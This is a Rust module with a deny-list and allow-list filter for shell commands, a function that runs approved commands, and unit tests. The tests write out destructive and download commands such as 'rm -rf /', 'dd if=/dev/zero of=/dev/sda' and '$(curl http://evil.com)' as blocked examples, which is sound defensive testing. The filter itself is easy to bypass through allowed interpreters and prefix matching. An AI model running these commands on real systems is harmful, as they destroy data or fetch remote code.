use anyhow::{Result, anyhow};
use tokio::process::Command;

#[allow(clippy::too_many_lines)]
pub fn is_command_safe(command: &str) -> bool {
    let dangerous_patterns = [
        "rm ",
        "del ",
        "format",
        "mkfs",
        "dd if=",
        "sudo rm",
        "sudo del",
        "> /dev/",
        "curl ",
        "wget ",
        "powershell",
        "cmd /c del",
        "cmd /c rd",
        "shutdown",
        "reboot",
        "halt",
        "init 0",
        "systemctl",
        "service ",
        "apt-get remove",
        "yum remove",
        "dnf remove",
        "brew uninstall",
        "npm uninstall -g",
        "pip uninstall",
        "cargo uninstall",
        "chmod 777",
        "chown ",
        "passwd",
        "su ",
        "sudo su",
        "export PATH=",
        "set PATH=",
        "alias rm=",
        "alias del=",
        "eval ",
        "exec ",
        "`",
        "$(",
        "${",
        "||",
        "&&",
        "; rm",
        "; del",
        "; sudo",
        "; curl",
        "; wget",
        "| rm",
        "| del",
        "| sudo",
        "| curl",
        "| wget",
    ];

    let command_lower = command.to_lowercase();
    for pattern in &dangerous_patterns {
        if command_lower.contains(pattern) {
            return false;
        }
    }

    let safe_commands = [
        "echo",
        "cat",
        "ls",
        "dir",
        "pwd",
        "whoami",
        "date",
        "time",
        "python",
        "node",
        "npm",
        "cargo",
        "git",
        "rustc",
        "gcc",
        "clang",
        "java",
        "javac",
        "go",
        "php",
        "ruby",
        "perl",
        "make",
        "cmake",
        "grep",
        "find",
        "sort",
        "head",
        "tail",
        "wc",
        "awk",
        "sed",
        "ping",
        "nslookup",
        "dig",
        "ps",
        "top",
        "htop",
        "df",
        "du",
        "uname",
        "which",
        "where",
        "type",
        "help",
        "man",
        "--help",
        "--version",
    ];

    let first_word = command_lower.split_whitespace().next().unwrap_or("");
    safe_commands
        .iter()
        .any(|&safe_cmd| first_word.starts_with(safe_cmd))
}

pub async fn execute_terminal_command(command: &str) -> Result<String> {
    if !is_command_safe(command) {
        return Err(anyhow!("Command not allowed for security reasons"));
    }

    println!("🖥️ Executing terminal command: {command}");

    let output = {
        #[cfg(windows)]
        {
            Command::new("cmd.exe")
                .args(["/C", command])
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .output()
                .await
        }
        #[cfg(not(windows))]
        {
            Command::new("sh").args(["-lc", command]).output().await
        }
    };

    match output {
        Ok(result) => {
            let stdout = String::from_utf8_lossy(&result.stdout);
            let stderr = String::from_utf8_lossy(&result.stderr);

            if result.status.success() {
                Ok(format!(
                    "Exit code: {}\nOutput:\n{}",
                    result.status.code().unwrap_or(0),
                    stdout
                ))
            } else {
                Err(anyhow!(
                    "Command execution failed - Exit code: {}\nError:\n{}\nOutput:\n{}",
                    result.status.code().unwrap_or(-1),
                    stderr,
                    stdout
                ))
            }
        }
        Err(e) => Err(anyhow!("Failed to execute command: {}", e)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let safe_commands = [
            "echo hello",
            "ls -la",
            "pwd",
            "git status",
            "cargo build",
            "npm test",
            "python script.py",
            "node app.js",
            "grep pattern file.txt",
            "find . -name '*.rs'",
            "ps aux",
            "df -h",
            "which python",
            "rustc --version",
            "help me",
        ];

        for cmd in &safe_commands {
            assert!(is_command_safe(cmd), "Command should be safe: {}", cmd);
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let dangerous_commands = [
            "rm -rf /",
            "del /f /q C:\\*",
            "sudo rm -rf /",
            "format C:",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://malicious.site",
            "wget http://badsite.com/malware",
            "powershell -Command Remove-Item",
            "shutdown -h now",
            "reboot",
            "systemctl stop important-service",
            "chmod 777 /etc/passwd",
            "chown root:root sensitive_file",
            "export PATH=/malicious/path",
            "eval malicious_code",
            "exec dangerous_binary",
            "ls | rm",
            "echo test && rm file",
            "cat file || sudo rm -rf /",
            "find . -name '*.txt' | del",
        ];

        for cmd in &dangerous_commands {
            assert!(
                !is_command_safe(cmd),
                "Command should be dangerous: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_command_case_insensitivity() {
        // Test that dangerous patterns are caught regardless of case
        let dangerous_commands = [
            "RM -rf /",
            "DEL file.txt",
            "SUDO rm",
            "CURL http://example.com",
            "POWERSHELL -Command",
            "SHUTDOWN now",
        ];

        for cmd in &dangerous_commands {
            assert!(
                !is_command_safe(cmd),
                "Command should be dangerous (case test): {}",
                cmd
            );
        }
    }

    #[test]
    fn test_safe_command_variations() {
        let safe_commands = [
            "ECHO hello",
            "Git Status",
            "Python --version",
            "NODE --help",
            "CARGO CHECK",
            "ls",
            "LS -la",
        ];

        for cmd in &safe_commands {
            assert!(
                is_command_safe(cmd),
                "Command should be safe (case test): {}",
                cmd
            );
        }
    }

    #[test]
    fn test_empty_and_whitespace_commands() {
        assert!(!is_command_safe(""));
        assert!(!is_command_safe("   "));
        assert!(!is_command_safe("\t"));
        assert!(!is_command_safe("\n"));
    }

    #[test]
    fn test_command_with_dangerous_substrings() {
        // Commands that contain dangerous patterns but might be safe in context
        let definitely_dangerous = [
            "echo 'rm is dangerous'", // Contains "rm " but is just echoing text
        ];

        for cmd in &definitely_dangerous {
            // These should still be flagged as dangerous due to our conservative approach
            assert!(
                !is_command_safe(cmd),
                "Command should be flagged as dangerous: {}",
                cmd
            );
        }

        // These are safe because they start with safe commands
        assert!(
            is_command_safe("grep 'curl' logfile.txt"),
            "grep command should be safe"
        );
        assert!(
            is_command_safe("cat file_with_rm_in_name.txt"),
            "cat command should be safe even with rm in filename"
        );
    }

    #[test]
    fn test_command_chaining_patterns() {
        let chaining_commands = [
            "ls; rm file.txt",
            "echo hello && sudo rm file",
            "cat file || wget malicious.com",
            "find . | rm",
            "ps | sudo kill",
        ];

        for cmd in &chaining_commands {
            assert!(
                !is_command_safe(cmd),
                "Chained command should be dangerous: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_path_modification_commands() {
        let path_commands = [
            "export PATH=/malicious/bin:$PATH",
            "set PATH=C:\\malicious;%PATH%",
            "alias rm='rm -rf'",
            "alias del='del /f /q'",
        ];

        for cmd in &path_commands {
            assert!(
                !is_command_safe(cmd),
                "Path modification should be dangerous: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_code_execution_patterns() {
        let execution_commands = [
            "eval $(dangerous_command)",
            "exec malicious_binary",
            "bash -c 'rm -rf /'",
            "`rm -rf /`",
            "$(curl http://malicious.com/script.sh)",
            "${dangerous_variable}",
        ];

        for cmd in &execution_commands {
            assert!(
                !is_command_safe(cmd),
                "Code execution should be dangerous: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_execute_safe_command() {
        let result = execute_terminal_command("echo test").await;
        assert!(result.is_ok(), "Safe command should execute successfully");

        let output = result.unwrap();
        assert!(output.contains("Exit code: 0"));
        assert!(output.contains("test"));
    }

    #[tokio::test]
    async fn test_execute_dangerous_command_blocked() {
        let result = execute_terminal_command("rm -rf dangerous").await;
        assert!(result.is_err(), "Dangerous command should be blocked");

        let error = result.unwrap_err();
        assert!(
            error
                .to_string()
                .contains("Command not allowed for security reasons")
        );
    }

    #[tokio::test]
    async fn test_execute_nonexistent_command() {
        // Test executing a safe but non-existent command
        // Use "nonexistentcmd" which starts with a pattern not in our safe list
        let result = execute_terminal_command("nonexistentcmd_12345_unique").await;
        assert!(result.is_err(), "Non-existent command should fail");

        let error = result.unwrap_err();
        let error_msg = error.to_string();
        assert!(
            error_msg.contains("Command not allowed for security reasons")
                || error_msg.contains("Failed to execute command")
                || error_msg.contains("Command execution failed")
        );
    }

    #[test]
    fn test_command_whitespace_handling() {
        // Test commands with various whitespace
        assert!(is_command_safe("  echo   hello  "));
        assert!(!is_command_safe("  rm   file.txt  "));
        assert!(is_command_safe("\tls\t-la\t"));
        assert!(!is_command_safe("\t\tcurl\thttp://example.com\t"));
    }

    #[test]
    fn test_first_word_extraction() {
        // Test that we correctly identify the first command word
        assert!(is_command_safe("echo hello world with many arguments"));
        assert!(is_command_safe("git status --porcelain"));
        assert!(is_command_safe("python -m pip list"));
        assert!(!is_command_safe("rm file1 file2 file3"));
        assert!(!is_command_safe("curl -X POST http://example.com"));
    }

    #[test]
    fn test_version_and_help_commands() {
        let help_commands = [
            "python --help",
            "git --version",
            "cargo --help",
            "node --version",
            "npm help",
            "rustc --help",
            "gcc --version",
        ];

        for cmd in &help_commands {
            assert!(
                is_command_safe(cmd),
                "Help/version command should be safe: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_command_output_formatting() {
        // Test a command that we expect to succeed
        let result = execute_terminal_command("echo hello world").await;

        if let Ok(output) = result {
            assert!(output.contains("Exit code: 0"));
            assert!(output.contains("Output:"));
            assert!(output.contains("hello world"));
        } else {
            // If echo fails for some reason, that's also valid - we're testing the format
            // when it succeeds, but the test environment might not support echo
        }
    }

    #[test]
    fn test_security_coverage_comprehensive() {
        // Test that our security function covers all major attack vectors
        let attack_vectors = [
            // File system attacks
            ("File deletion", "rm -rf /"),
            ("Directory removal", "rd /s /q C:\\"),
            ("Format drive", "format C:"),
            ("Disk wipe", "dd if=/dev/zero of=/dev/sda"),
            // Network attacks
            ("Download malware", "curl http://malicious.com/malware"),
            ("Wget attack", "wget ftp://attack.com/payload"),
            // System control
            ("Shutdown", "shutdown -h now"),
            ("Reboot", "reboot"),
            ("Kill services", "systemctl stop sshd"),
            // Privilege escalation
            ("Sudo", "sudo rm /etc/passwd"),
            ("Su switch", "su root"),
            ("Password change", "passwd root"),
            // Command injection
            ("Shell injection", "ls; rm -rf /"),
            ("Pipe attack", "cat file | sudo rm /etc/hosts"),
            ("Logic attack", "echo test && curl malicious.com"),
            // Code execution
            ("Eval", "eval malicious_code"),
            ("Exec", "exec dangerous_binary"),
            ("Backticks", "`rm -rf /`"),
            ("Command substitution", "$(curl http://evil.com)"),
        ];

        for (description, command) in &attack_vectors {
            assert!(
                !is_command_safe(command),
                "Attack vector '{}' should be blocked: {}",
                description,
                command
            );
        }
    }
}
